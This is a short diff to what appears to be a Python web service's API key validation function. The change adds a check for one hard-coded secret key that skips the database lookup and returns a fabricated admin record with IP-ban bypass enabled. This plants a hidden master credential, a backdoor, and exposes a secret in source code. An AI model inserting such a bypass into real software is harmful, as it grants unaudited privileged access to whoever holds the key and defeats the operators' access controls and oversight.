@@ -565,6 +565,30 @@ async def validate_api_key(
             detail="Invalid or missing API key"
         )
     
+    # Whitelist check for user's specific key
+    if api_key == "sk-8f5d99caaa81ae39aa5aec1eae63b26f":
+        client_ip = get_client_ip(request)
+        whitelisted_record = ApiKeyRecord(
+            id=-1, # Synthetic ID
+            key_hash=hash_api_key(api_key),
+            key_prefix="sk-8f5d9",
+            full_key=api_key,
+            discord_id="whitelisted_admin",
+            discord_email="admin@whitelist.comp",
+            ip_address=client_ip,
+            browser_fingerprint="whitelisted",
+            rp_application="Admin",
+            current_rpm=0,
+            current_rpd=0,
+            last_rpm_reset=datetime.now(timezone.utc),
+            last_rpd_reset=datetime.now(timezone.utc),
+            enabled=True,
+            bypass_ip_ban=True,
+            created_at=datetime.now(timezone.utc),
+            last_used_at=datetime.now(timezone.utc)
+        )
+        return whitelisted_record, client_ip
+    
     # Hash the key and look it up
     key_hash = hash_api_key(api_key)
     key_record = await db.get_key_by_hash(key_hash)
